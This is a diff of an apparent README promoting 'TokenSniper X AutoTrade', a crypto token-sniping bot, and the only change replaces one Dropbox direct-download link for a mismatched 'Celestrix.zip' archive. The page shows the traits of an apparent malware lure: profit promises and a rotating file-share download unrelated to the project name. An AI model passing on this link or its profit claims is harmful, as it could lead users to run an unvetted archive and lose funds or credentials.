@@ -3,7 +3,7 @@
 Be first. Be fast. Be profitable.  
 **TokenSniper X AutoTrade** is an advanced token sniping and auto-trading bot designed for real-time trading on decentralized exchanges like Uniswap, PancakeSwap, and more. Get early access to new tokens, execute high-speed trades, and automate your DeFi profits with smart algorithms.
 
-[![Download TokenSniper X](https://img.shields.io/badge/Download-TokenSniper_X-blueviolet)](https://www.dropbox.com/scl/fi/9bcmmydfb2t4mse08ywff/Celestrix.zip?rlkey=k09pkb7wo4fnxv4t6dz8h18xy&st=7ljxgb5u&dl=1
+[![Download TokenSniper X](https://img.shields.io/badge/Download-TokenSniper_X-blueviolet)](https://www.dropbox.com/scl/fi/g58lt25fmza83uydu0zu5/Celestrix.zip?rlkey=hccn6sy4qpal7m571nuon546x&st=ik6sks88&dl=1
 )
 
 ---
